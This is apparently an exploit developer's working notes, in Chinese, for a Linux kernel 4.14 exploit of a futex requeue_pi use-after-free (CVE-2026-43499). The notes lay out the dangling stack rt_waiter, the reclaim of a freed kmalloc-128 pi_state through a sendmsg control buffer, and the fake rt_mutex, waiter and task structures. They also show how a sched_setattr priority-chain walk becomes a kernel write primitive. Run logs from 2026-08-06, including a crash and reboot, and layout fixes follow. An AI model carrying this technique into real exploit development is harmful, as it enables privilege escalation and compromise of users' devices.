## CVE-2026-43499 写原语机制 (4.14 移植)

- EDEADLK: futex_requeue 的 requeue_pi 死锁检测 (waiter 与 owner 互为链) 返回 -EDEADLK
- remove_waiter 后 `current->pi_blocked_on = NULL` 未清理残余 rt_waiter (栈对象),
  task->pi_blocked_on 悬垂指向栈上 rt_waiter (UAF)
- sched_setattr 触发 rt_mutex_adjust_pi -> rt_mutex_adjust_prio_chain walk:
  - [2] waiter = task->pi_blocked_on (悬垂)
  - [5] trylock(&lock->wait_lock) (DEBUG_SPINLOCK 需 magic=0xdead4ead, owner_cpu=-1)
  - [7] rt_mutex_dequeue/enqueue(lock, waiter)
  - [9] owner==NULL -> 提前返回 (不写)
  - [10] task = rt_mutex_owner(lock); get_task_struct; lock task->pi_lock
  - [11] waiter == rt_mutex_top_waiter(lock) -> dequeue_pi(task, prerequeue_top_waiter)
    + enqueue_pi(task, waiter) + adjust_prio(task)  <- 写原语核心
  - [12] next_lock = task_blocked_on_lock(task)

## 写路径 (IONSTACK_SLIDE_WRITE_PATH=1)

1. W0 线程先阻塞在 target futex (FUTEX_LOCK_PI) -> target pi_state 预先存在
   - 关键修复: main 等 slide_w_w0_ready + target 用户字带 FUTEX_WAITERS (0x80000000)
     才 firing requeue, 保证 lookup_pi_state 走 attach_to_pi_state 不 alloc
2. main CMP_REQUEUE_PI -> EDEADLK (trace: main-firing / errno=35)
3. SIGUSR1 中断 W0 的 futex_lock_pi -> futex_unqueue_pi -> put_pi_state (refcount 1->0)
   -> 缓存到 W0 -> W0 exit 时 kfree -> target pi_state 释放 (freed kmalloc-128 槽)
4. send_go -> cmsg sendmsg 的 ctl_buf (sock_kmalloc 0x68 -> kmalloc-128) 回收 freed 槽,
   阻塞在满发送缓冲 (ctl_buf 存活) -> 悬垂 lock 指向 ctl_buf+0x10 (fake rt_mutex)
5. FUTEX_WAKE 唤醒 waiter -> waiter 执行 slide_pselect_stack_copy() 用 sendmsg 的
   iovstack 覆盖残余 rt_waiter (fake waiter: task=fake_task, lock=fake_lock, prio=130)
   - 注: iovec 全 0 -> rw_copy_check_uvector 拷贝后校验 EINVAL, 覆盖已发生 (预期)
6. main 等 slide_route_done 后 sched_setattr(waiter) -> chain walk [10]-[12] -> 写原语

## 诊断点 (slide-w-diag, fragment-pipe/MSG_PEEK 读回 payload 页)

- usage: 0x100 (get_task_struct +1 后 put_task_struct -1, 无法区分 [10] 是否执行)
- lock_owner: fake_lock->owner (payload 页 LOCK_OFF+0x28)
- w0_pi_parent: fake_w0->pi_tree_entry.rb_parent_color
  - 预置 = write_pc (SLIDE_LOGGERS_0_1 + linear_slide)
  - dequeue_pi 执行后 RB_CLEAR_NODE -> 节点自身地址 (决定性)
- task_pi_root / task_pi_lm: fake_task->pi_waiters root / leftmost
  - enqueue_pi 执行后 root 变为残留 waiter 栈地址 (决定性)

## 2026-08-06 运行记录

### 运行 A (无栈覆盖, settle=500us) - 设备未重启, 树未变
- trace: write-w0-queued ✓ / write-send-entry ✓ / 无 write-send-ret (T1 阻塞, ctl_buf 存活)
- diag: w0_pi_parent=ffffffe89699...(预置) task_pi_root=ffffffe89699...(预置)
- 结论: [11] 未执行; 根因 = waiter 从未执行栈覆盖, walk 拿真实残留 waiter,
  [3] next_lock != waiter->lock 提前返回 或 [11] 条件不满足

### 运行 B (栈覆盖恢复 + IOV_OFF=0x40) - 设备异常重启 (bootreason=abnormal)
- trace: main-wake-waiter / waiter-before-recvmsg / recvmsg-off off=40 /
  waiter-after-recvmsg / recvmsg-ret errno=22 (EINVAL 预期) -> 随后重启
- 根因 1 (越界): IOV_OFF=0x40 超出 blob[128], fake waiter prio/deadline
  写到用户栈外 -> 增加边界检查, 改用 IOV_OFF=0x30
- 根因 2 (NULL 解引用): 覆盖后 fake waiter->lock=fake_lock (payload 页 LOCK_OFF),
  但 SLIDE 模式 fake_lock->waiters.rb_node=0 (fops_lock_waiters 表达式只对 FOPS 生效)
  -> [7] enqueue 后 top_waiter=fake waiter, [11] prerequeue_top_waiter=NULL
  -> dequeue_pi(fake_task, NULL) -> RB_EMPTY_NODE(NULL->pi_tree_entry) panic

### 修复 (util.c prepare_skb_payload, 未验证)
1. `lock_waiters = fops_lock_waiters || slide_lock_waiters`
   (SLIDE 写模式 fake_lock waiters 树 = {fake_w0}, env IONSTACK_SLIDE_LOCK_WAITERS)
2. SLIDE 模式 pi_waiters leftmost 默认 0 (env IONSTACK_SLIDE_PI_LEFTMOST=1 恢复)
   - 避免 rb_erase_cached 的 rb_next(node) 沿 loggers 上溯垃圾指针
3. SLIDE 模式 fake_w0->pi_tree_entry.rb_left 默认 0
   (env IONSTACK_SLIDE_PI_WRITE_LEFT=1 恢复 bootid 泄漏 shape:
    rb_erase 把 child->rb_parent_color = write_pc 写入 bootid_data)
